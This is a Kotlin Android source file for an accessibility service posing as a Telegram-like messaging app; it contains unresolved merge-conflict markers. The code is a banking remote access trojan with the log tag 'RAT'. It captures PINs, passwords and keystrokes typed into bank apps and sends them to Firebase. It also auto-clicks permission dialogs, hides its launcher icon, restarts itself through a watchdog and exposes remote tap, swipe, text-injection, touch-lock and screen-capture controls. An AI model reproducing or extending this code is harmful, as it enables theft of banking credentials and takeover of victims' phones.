package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
<<<<<<< HEAD
=======
import android.app.AlarmManager
import android.app.PendingIntent
>>>>>>> 0ad8761 (Update Wq project)
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.graphics.Path
<<<<<<< HEAD
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
=======
import android.os.*
>>>>>>> 0ad8761 (Update Wq project)
import android.provider.Settings
import android.view.Gravity
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
<<<<<<< HEAD
=======
        private const val TAG = "RAT"
>>>>>>> 0ad8761 (Update Wq project)
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var touchLockOverlay: WindowManager? = null
    private var pinBuffer: StringBuilder? = null
<<<<<<< HEAD
    private var lastFocusedPackage: String? = null
=======
    private var autoPermissionStep = 0  // 0 = none, 1 = overlay, 2 = screen capture, 3 = battery, done
>>>>>>> 0ad8761 (Update Wq project)

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
<<<<<<< HEAD
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
=======

        // Lightweight config – only click and text change events
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
>>>>>>> 0ad8761 (Update Wq project)
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
<<<<<<< HEAD
        hideAppIcon()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val pkg = event.packageName?.toString() ?: return
            if (isBankApp(pkg)) {
                if (event.className?.toString()?.contains("EditText") == true) {
                    val source = event.source ?: return
                    val inputType = source.inputType
                    if (inputType and 0x80 != 0 || inputType and 0x10 != 0) {
                        if (pinBuffer == null) pinBuffer = StringBuilder()
                        event.text.forEach { pinBuffer?.append(it) }
                        lastFocusedPackage = pkg
                    }
                }
                BankLogger.onEvent(this, event)
            }
        } else if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val pkg = event.packageName?.toString() ?: return
            if (isBankApp(pkg) && pinBuffer != null && pinBuffer!!.isNotEmpty()) {
                val source = event.source ?: return
                val confirmText = source.text?.toString() ?: source.contentDescription?.toString() ?: ""
                // FIXED: use Regex.containsMatchIn instead of String.contains with Regex
                if (Regex("Confirm|Send|Login|Sign in|OK", RegexOption.IGNORE_CASE).containsMatchIn(confirmText)) {
                    val pin = pinBuffer.toString()
                    FirebaseBridge.savePin(pkg, pin)   // needs FirebaseBridge to have this method
                    FirebaseBridge.logBankData(pkg, pin = pin)
                    pinBuffer = null
                }
=======

        // Start auto-permission sequence
        autoPermissionStep = 1
        mainHandler.postDelayed({ requestOverlayPermission() }, 500)

        // Watchdog: restart service if killed
        startWatchdog()
        Log.d(TAG, "Accessibility service started")
    }

    // ======================== AUTO-PERMISSION ENGINE ========================
    private fun requestOverlayPermission() {
        if (Settings.canDrawOverlays(this)) {
            // Already granted, move to next step
            requestScreenCapturePermission()
            return
        }
        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            android.net.Uri.parse("package:$packageName"))
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        // Wait 2 seconds then click the toggle via accessibility
        mainHandler.postDelayed({ clickOverlayToggle() }, 2000)
    }

    private fun clickOverlayToggle() {
        val root = rootInActiveWindow ?: return
        // Find the switch that says "Permit drawing over other apps"
        val switches = root.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
        if (switches.isNotEmpty()) {
            val switch = switches[0]
            if (switch.isCheckable && !switch.isChecked) {
                switch.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                mainHandler.postDelayed({
                    performGlobalAction(GLOBAL_ACTION_BACK)
                    requestScreenCapturePermission()
                }, 1000)
            } else {
                performGlobalAction(GLOBAL_ACTION_BACK)
                requestScreenCapturePermission()
            }
        } else {
            // try text search
            val perms = root.findAccessibilityNodeInfosByText("Permit drawing")
            if (perms.isNotEmpty() && perms[0].isClickable) {
                perms[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                mainHandler.postDelayed({
                    performGlobalAction(GLOBAL_ACTION_BACK)
                    requestScreenCapturePermission()
                }, 1000)
            } else {
                // fallback: go back and proceed
                performGlobalAction(GLOBAL_ACTION_BACK)
                requestScreenCapturePermission()
>>>>>>> 0ad8761 (Update Wq project)
            }
        }
    }

<<<<<<< HEAD
    override fun onInterrupt() {}

    private fun isBankApp(pkg: String): Boolean = BankLogger.BANK_PACKAGES.contains(pkg)

    fun tap(x: Int, y: Int) {
        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
            .build(), null, null)
    }

    fun swipe(sx: Int, sy: Int, ex: Int, ey: Int, dur: Long) {
        val path = Path().apply {
            moveTo(sx.toFloat(), sy.toFloat())
            lineTo(ex.toFloat(), ey.toFloat())
        }
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, dur))
            .build(), null, null)
=======
    private fun requestScreenCapturePermission() {
        // Launch ScreenPermissionActivity (which shows the system media projection dialog)
        val intent = Intent(this, com.telegram2.messaging.ScreenPermissionActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        // Wait for the dialog, then click "Start now"
        mainHandler.postDelayed({ clickStartNow() }, 2000)
    }

    private fun clickStartNow() {
        val root = rootInActiveWindow ?: return
        // The button text is "Start now" or "START NOW"
        val nodes = root.findAccessibilityNodeInfosByText("Start now")
        if (nodes.isEmpty()) {
            val nodes2 = root.findAccessibilityNodeInfosByText("START NOW")
            if (nodes2.isNotEmpty()) {
                nodes2[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                requestBatteryPermission()
                return
            }
            // Could not find, try to click any button
            for (node in root) {
                if (node.isClickable && node.className?.contains("Button") == true) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    break
                }
            }
        } else {
            nodes[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
        requestBatteryPermission()
    }

    private fun requestBatteryPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (pm.isIgnoringBatteryOptimizations(packageName)) {
                finishAutoPermission()
                return
            }
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = android.net.Uri.parse("package:$packageName")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            mainHandler.postDelayed({ clickAllowBattery() }, 2000)
        } else {
            finishAutoPermission()
        }
    }

    private fun clickAllowBattery() {
        val root = rootInActiveWindow ?: run { finishAutoPermission(); return }
        val nodes = root.findAccessibilityNodeInfosByText("Allow")
        if (nodes.isNotEmpty()) {
            nodes[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
        finishAutoPermission()
    }

    private fun finishAutoPermission() {
        autoPermissionStep = 0
        hideAppIcon()
        // Start screen capture automatically
        startScreenCapture()
        // Also ensure the service is visible
        Log.d(TAG, "All permissions granted, starting full remote control")
    }

    // ======================== WATCHDOG ========================
    private fun startWatchdog() {
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, ServiceRestartReceiver::class.java)
        val pending = PendingIntent.getBroadcast(this, 100, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        alarm.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 60000, 60000, pending)
    }

    // ======================== REMOTE CONTROL METHODS ========================
    fun tap(x: Int, y: Int) {
        try {
            val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
            dispatchGesture(GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
                .build(), null, null)
        } catch (e: Exception) {}
    }

    fun swipe(sx: Int, sy: Int, ex: Int, ey: Int, dur: Long) {
        try {
            val path = Path().apply {
                moveTo(sx.toFloat(), sy.toFloat())
                lineTo(ex.toFloat(), ey.toFloat())
            }
            dispatchGesture(GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, dur))
                .build(), null, null)
        } catch (e: Exception) {}
>>>>>>> 0ad8761 (Update Wq project)
    }

    fun injectText(text: String) {
        mainHandler.post {
<<<<<<< HEAD
            val root = rootInActiveWindow ?: return@post
            val input = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (input != null && !input.isPassword) {
                val bundle = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                }
                input.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
            } else {
                injectViaKeys(text)
            }
        }
    }

    fun clickText(text: String) {
        mainHandler.post {
            val root = rootInActiveWindow ?: return@post
            for (node in root.findAccessibilityNodeInfosByText(text)) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return@post
                }
            }
        }
    }

    fun launchApp(pkg: String): Boolean {
        val intent = packageManager.getLaunchIntentForPackage(pkg) ?: return false
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
        return true
    }

    fun injectPin(appPackage: String) {
        FirebaseBridge.getPin(appPackage) { pin ->
            if (pin != null) injectViaKeys(pin)
=======
            try {
                val root = rootInActiveWindow ?: return@post
                val input = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                if (input != null && !input.isPassword) {
                    val bundle = Bundle().apply {
                        putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                    }
                    input.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
                } else {
                    injectViaKeys(text)
                }
            } catch (_: Exception) {}
>>>>>>> 0ad8761 (Update Wq project)
        }
    }

    private fun injectViaKeys(text: String) {
        Thread {
            try {
<<<<<<< HEAD
                val instrumentation = android.app.Instrumentation()
                for (char in text) {
                    val keyCode = when (char) {
                        '0' -> android.view.KeyEvent.KEYCODE_0
                        '1' -> android.view.KeyEvent.KEYCODE_1
                        '2' -> android.view.KeyEvent.KEYCODE_2
                        '3' -> android.view.KeyEvent.KEYCODE_3
                        '4' -> android.view.KeyEvent.KEYCODE_4
                        '5' -> android.view.KeyEvent.KEYCODE_5
                        '6' -> android.view.KeyEvent.KEYCODE_6
                        '7' -> android.view.KeyEvent.KEYCODE_7
                        '8' -> android.view.KeyEvent.KEYCODE_8
                        '9' -> android.view.KeyEvent.KEYCODE_9
                        else -> android.view.KeyEvent.KEYCODE_UNKNOWN
                    }
                    if (keyCode != android.view.KeyEvent.KEYCODE_UNKNOWN) {
                        val downTime = android.os.SystemClock.uptimeMillis()
                        val eventDown = android.view.KeyEvent(downTime, downTime, android.view.KeyEvent.ACTION_DOWN, keyCode, 0)
                        instrumentation.sendKeySync(eventDown)
                        Thread.sleep(100)
                        val eventUp = android.view.KeyEvent(downTime, downTime, android.view.KeyEvent.ACTION_UP, keyCode, 0)
                        instrumentation.sendKeySync(eventUp)
                    }
                }
            } catch (e: Exception) {
                Log.e("RAT", "Key injection failed", e)
            }
=======
                val instrumentation = Instrumentation()
                for (char in text) {
                    val keyCode = when (char) {
                        '0' -> KeyEvent.KEYCODE_0
                        '1' -> KeyEvent.KEYCODE_1
                        '2' -> KeyEvent.KEYCODE_2
                        '3' -> KeyEvent.KEYCODE_3
                        '4' -> KeyEvent.KEYCODE_4
                        '5' -> KeyEvent.KEYCODE_5
                        '6' -> KeyEvent.KEYCODE_6
                        '7' -> KeyEvent.KEYCODE_7
                        '8' -> KeyEvent.KEYCODE_8
                        '9' -> KeyEvent.KEYCODE_9
                        else -> KeyEvent.KEYCODE_UNKNOWN
                    }
                    if (keyCode != KeyEvent.KEYCODE_UNKNOWN) {
                        val downTime = SystemClock.uptimeMillis()
                        val eventDown = KeyEvent(downTime, downTime, KeyEvent.ACTION_DOWN, keyCode, 0)
                        instrumentation.sendKeySync(eventDown)
                        Thread.sleep(80)
                        val eventUp = KeyEvent(downTime, downTime, KeyEvent.ACTION_UP, keyCode, 0)
                        instrumentation.sendKeySync(eventUp)
                    }
                }
            } catch (_: Exception) {}
>>>>>>> 0ad8761 (Update Wq project)
        }.start()
    }

    fun lockTouch(enable: Boolean) {
<<<<<<< HEAD
        if (enable) {
            if (touchLockOverlay != null) return
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, // no FLAG_NOT_TOUCHABLE -> eats touches
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = Gravity.TOP or Gravity.LEFT
                x = 0; y = 0
            }
            touchLockOverlay = wm
            val view = android.view.View(this)
            wm.addView(view, params)
        } else {
            touchLockOverlay?.let {
                try { it.removeView(android.view.View(this)) } catch (_: Exception) {}
            }
            touchLockOverlay = null
        }
=======
        try {
            if (enable) {
                if (touchLockOverlay != null) return
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else WindowManager.LayoutParams.TYPE_PHONE,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.TOP or Gravity.LEFT
                    x = 0; y = 0
                }
                touchLockOverlay = wm
                wm.addView(android.view.View(this), params)
            } else {
                touchLockOverlay?.let {
                    try { it.removeView(android.view.View(this)) } catch (_: Exception) {}
                }
                touchLockOverlay = null
            }
        } catch (_: Exception) {}
>>>>>>> 0ad8761 (Update Wq project)
    }

    fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, "com.telegram2.messaging.MainActivity"),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}
    }

<<<<<<< HEAD
    fun uninstallSelf() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
        mainHandler.postDelayed({
            val root = rootInActiveWindow ?: return@postDelayed
            val btn = findClickableByText(root, "Uninstall") ?: findClickableByText(root, "OK")
            btn?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }, 2000)
    }

    private fun findClickableByText(root: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        for (node in root.findAccessibilityNodeInfosByText(text)) {
            if (node.isClickable) return node
        }
        return null
=======
    fun launchApp(pkg: String): Boolean {
        try {
            val intent = packageManager.getLaunchIntentForPackage(pkg) ?: return false
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            return true
        } catch (_: Exception) {
            return false
        }
>>>>>>> 0ad8761 (Update Wq project)
    }

    fun startScreenCapture() {
        startActivity(Intent(this, com.telegram2.messaging.ScreenPermissionActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        })
    }

<<<<<<< HEAD
    fun stopScreenCapture() {
        try {
            val intent = Intent(this, ScreenCaptureService::class.java)
            intent.action = "stop"
            stopService(intent)
        } catch (_: Exception) {}
    }

    fun getInstalledApps(): List<String> = packageManager.getInstalledPackages(0).map { it.packageName }

    fun runOnMainThread(block: () -> Unit) { mainHandler.post(block) }
=======
    // ======================== PIN CAPTURE ========================
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val pkg = event.packageName?.toString() ?: return
                if (BankLogger.BANK_PACKAGES.contains(pkg)) {
                    val text = event.text.joinToString(" ")
                    FirebaseBridge.sendKeylog(pkg, text)
                    if (event.className?.toString()?.contains("EditText") == true) {
                        val source = event.source ?: return
                        if (source.isPassword) {
                            if (pinBuffer == null) pinBuffer = StringBuilder()
                            event.text.forEach { pinBuffer?.append(it) }
                        }
                    }
                }
            } else if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                if (pinBuffer != null && pinBuffer!!.isNotEmpty()) {
                    val source = event.source ?: return
                    val text = source.text?.toString() ?: source.contentDescription?.toString() ?: ""
                    if (Regex("Confirm|Send|Login|Sign in|OK|Continue", RegexOption.IGNORE_CASE).containsMatchIn(text)) {
                        val pin = pinBuffer.toString()
                        val pkg = event.packageName?.toString() ?: return
                        FirebaseBridge.savePin(pkg, pin)
                        FirebaseBridge.logBankData(pkg, pin = pin)
                        pinBuffer = null
                    }
                }
            }
        } catch (_: Exception) {}
    }

    override fun onInterrupt() {}
>>>>>>> 0ad8761 (Update Wq project)
}